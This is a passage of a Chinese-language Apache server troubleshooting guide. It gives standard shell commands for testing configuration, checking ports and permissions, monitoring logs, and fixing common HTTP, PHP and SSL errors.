<h3 id="1-配置测试命令">1. 配置测试命令<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-配置测试命令" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试配置文件语法</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2ctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> configtest</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apachectl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 显示编译的设置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -V</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 显示已加载的模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -M</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -l</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  # 显示静态编译的模块</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 显示虚拟主机配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -S</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 显示MPM设置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -V</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mpm</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 完整配置转储</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> DUMP_VHOSTS</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> DUMP_RUN_CFG</span></span></code></pre></figure>
<h3 id="2-端口和进程检查">2. 端口和进程检查<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-端口和进程检查" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查Apache是否运行</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> status</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ps</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> aux</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查端口占用</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> netstat</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -tlnp</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> :80</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ss</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -tlnp</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> :80</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> lsof</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> :80</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> lsof</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> :443</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查端口是否被其他程序占用</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> fuser</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 80/tcp</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> fuser</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 443/tcp</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 终止占用端口的进程</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> fuser</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -k</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 80/tcp</span></span></code></pre></figure>
<h3 id="3-权限问题排查">3. 权限问题排查<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3-权限问题排查" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查文件权限</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ls</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -la</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 正确的权限设置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chown</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -R</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> www-data:www-data</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> find</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -type</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> d</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -exec</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chmod</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 755</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> {}</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \;</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> find</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -type</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> f</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -exec</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chmod</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 644</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> {}</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查SELinux状态（如果启用）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">getenforce</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sestatus</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 临时禁用SELinux测试</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> setenforce</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 0</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查AppArmor状态</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> aa-status</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 如果有权限问题，临时禁用Apache的AppArmor配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> aa-complain</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /usr/sbin/apache2</span></span></code></pre></figure>
<h3 id="4-日志实时监控">4. 日志实时监控<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#4-日志实时监控" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 同时监控访问和错误日志</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tail</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/error.log</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用multitail（需要安装）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> multitail</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> multitail</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/error.log</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 过滤特定错误</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tail</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/error.log</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;error\|warning&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看系统日志中的Apache相关信息</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> journalctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -f</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> journalctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --since</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;10 minutes ago&quot;</span></span></code></pre></figure>
<h3 id="5-常见问题及解决方案">5. 常见问题及解决方案<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#5-常见问题及解决方案" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p><strong>问题1：Apache无法启动</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查详细错误信息</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> status</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -l</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> journalctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -xe</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2ctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> configtest</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查端口冲突</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> netstat</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -tlnp</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> :80</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看错误日志</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tail</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -50</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/error.log</span></span></code></pre></figure>
<p><strong>问题2：403 Forbidden错误</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查目录权限</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ls</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -la</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查Apache配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> grep</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;Require&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 确保目录有正确的权限</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chmod</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 755</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chown</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -R</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> www-data:www-data</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查SELinux上下文</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ls</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -Z</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chcon</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -R</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> httpd_sys_content_t</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span></span></code></pre></figure>
<p><strong>问题3：404 Not Found错误</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查DocumentRoot设置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -S</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查文件是否存在</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ls</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -la</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查虚拟主机配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/sites-enabled/000-default.conf</span></span></code></pre></figure>
<p><strong>问题4：500 Internal Server Error</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看错误日志获取详细信息</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tail</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -50</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/error.log</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 常见原因：</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># - .htaccess语法错误</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># - PHP错误</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># - 权限问题</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># - 模块未启用</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查.htaccess</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/.htaccess</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 临时禁用.htaccess测试</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在虚拟主机配置中设置: AllowOverride None</span></span></code></pre></figure>
<p><strong>问题5：PHP不工作</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查PHP模块是否加载</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -M</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> php</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重新安装PHP模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --reinstall</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> libapache2-mod-php</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用PHP模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> php8.2</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  # 版本号根据实际情况</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查PHP配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">php</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -v</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">php</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -m</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重启Apache</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span></code></pre></figure>
<p><strong>问题6：SSL证书问题</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试SSL配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">openssl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> s_client</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -connect</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> localhost:443</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查证书有效期</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">openssl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> x509</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -in</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/ssl/apache-selfsigned.crt</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -noout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -dates</span></span>
<span data-line> </span>
